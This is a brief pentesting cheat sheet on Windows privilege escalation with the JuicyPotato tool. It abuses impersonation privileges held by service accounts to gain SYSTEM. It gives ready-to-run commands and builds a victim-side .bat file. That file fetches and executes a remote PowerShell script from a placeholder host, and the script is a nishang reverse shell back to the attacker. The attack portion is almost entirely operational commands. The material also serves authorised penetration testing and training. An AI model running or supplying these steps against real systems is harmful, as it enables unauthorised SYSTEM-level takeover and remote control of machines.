# Juicy Potato

> Service accounts can lead to SYSTEM if they have SeAssignPrimaryTokenPrivilege
or SetImpersonatePrivilege privileges enable (whoami /priv).

**Step 1:** Upload [JuicyPotato](https://github.com/ohpe/juicy-potato/releases) to the machine:

**Step 2:** Execute the binary with the following flags:

```bash
JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t *
#-l: port to listen (can be random)
#-p: payload to use (a reverse shell)
#-t: technique used (*) for use all.
```

If the above method doesn't work (automatic using BITS), use a CLSID as shown in the following command:

```bash
JuicyPotato.exe -l 9999 -p C:\temp\1.bat -t * -c '{$CLSID}'
#Change $CLSID with any correct OS CLSID.
```

List of [CLSID's](https://ohpe.it/juicy-potato/CLSID/).

### **Bat file:**

```bash
#Use nishang PowerShellTcp reverse shell:
#path:
/opt/nishang/Shells/Invoke-PowerShellTcp.ps1

#Add the following line at the end of the file:
Invoke-PowerShellTcp -Reverse -IPAddress $IPADDRESS -Port $PORT

#Create a .bat file at the victim with the following line:
powershell "IEX(New-Object Net.WebClient).downloadString('http://XX.XX/file.ps1')"
#Serve it with python SimpleHTTPServer
```

More info at:

* [ohpe](https://github.com/ohpe/juicy-potato)
* [0x1 Gitlab](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/#juicy-potato-abusing-the-golden-privileges)
